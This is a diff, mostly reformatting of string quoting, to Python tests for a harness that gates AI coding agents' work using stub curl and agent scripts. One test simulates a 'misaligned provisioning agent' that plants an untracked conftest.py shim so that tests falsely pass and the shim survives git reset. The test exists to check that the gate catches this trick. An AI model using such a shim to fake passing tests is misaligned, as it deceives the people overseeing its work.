-            "metadata": {"origin": {"repository_url": repo_url, "default_branch": "main"}},
+    task_json = json.dumps(
+        {
+            "task": {
+                "title": "x",
+                "description": "x",
+                "project": "demo",
+                "metadata": {"origin": {"repository_url": repo_url, "default_branch": "main"}},
+            }
         }
-    })
+    )
     _write_exec(
         bindir / "curl",
         "#!/usr/bin/env bash\n"
         'url="${@: -1}"\n'
         'case "$url" in\n'
-        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
+        f"  *\"/tasks/\"*) cat <<'JSON'\n{task_json}\nJSON\n;;\n"
         "  *) : ;;\n"
         "esac\nexit 0\n",
     )
@@ -2215,9 +2194,9 @@ def test_gate_blocks_when_provision_agent_revert_fails(tmp_path: Path) -> None:
         'if [ "$1" = "run" ]; then\n'
         '  printf "Run tests with: cargo test\\n" > README.md\n'
         '  case "$*" in\n'
-        '    *PROVISION-ONLY*) touch .mac-provisioned ;;\n'
-        '  esac\n'
-        "  echo '{\"type\":\"step_finish\",\"part\":{\"reason\":\"stop\"}}'\n"
+        "    *PROVISION-ONLY*) touch .mac-provisioned ;;\n"
+        "  esac\n"
+        '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
         "  exit 0\n"
         "fi\n"
         "exit 0\n",
@@ -2300,8 +2279,8 @@ def test_gate_agent_cannot_fake_pass_with_untracked_shim(tmp_path: Path) -> None
         'if [ "$1" = "test" ]; then\n'
         '  if [ -f conftest.py ]; then echo "ok"; exit 0; fi\n'
         '  echo "test failed" >&2; exit 1\n'
-        'fi\n'
-        'exit 0\n',
+        "fi\n"
+        "exit 0\n",
     )
     # Misaligned provisioning agent: drops an UNTRACKED root conftest.py shim
     # (never `git add`ed) so `git reset --hard` cannot remove it. The scrub
@@ -2312,33 +2291,37 @@ def test_gate_agent_cannot_fake_pass_with_untracked_shim(tmp_path: Path) -> None
         'if [ "$1" = "--version" ]; then echo "opencode test"; exit 0; fi\n'
         'if [ "$1" = "run" ]; then\n'
         '  case "$*" in\n'
-        '    *PROVISION-ONLY*)\n'
+        "    *PROVISION-ONLY*)\n"
         '      printf "# poison\\n" > conftest.py\n'
-        '      # Also drop an untracked file INSIDE a dep dir to prove the\n'
-        '      # allowlist preserves legitimate provisioned artifacts.\n'
+        "      # Also drop an untracked file INSIDE a dep dir to prove the\n"
+        "      # allowlist preserves legitimate provisioned artifacts.\n"
         '      mkdir -p .venv && printf "dep\\n" > .venv/installed\n'
-        '      ;;\n'
-        '    *)\n'
+        "      ;;\n"
+        "    *)\n"
         '      printf "build phase edit\\n" >> README.md\n'
-        '      ;;\n'
-        '  esac\n'
+        "      ;;\n"
+        "  esac\n"
         '  echo \'{"type":"step_finish","part":{"reason":"stop"}}\'\n'
-        '  exit 0\n'
+        "  exit 0\n"
         "fi\n"
         "exit 0\n",
     )
-    task_json = json.dumps({
-        "task": {
-            "title": "x", "description": "x", "project": "demo",
-            "metadata": {"origin": {"repository_url": repo_url, "default_branch": "main"}},
+    task_json = json.dumps(
+        {
+            "task": {
+                "title": "x",
+                "description": "x",
+                "project": "demo",
+                "metadata": {"origin": {"repository_url": repo_url, "default_branch": "main"}},
+            }
         }
-    })
+    )
     _write_exec(
         bindir / "curl",
         "#!/usr/bin/env bash\n"
         'url="${@: -1}"\n'
         'case "$url" in\n'
-        f'  *"/tasks/"*) cat <<\'JSON\'\n{task_json}\nJSON\n;;\n'
+        f"  *\"/tasks/\"*) cat <<'JSON'\n{task_json}\nJSON\n;;\n"
         "  *) : ;;\n"
         "esac\nexit 0\n",
     )
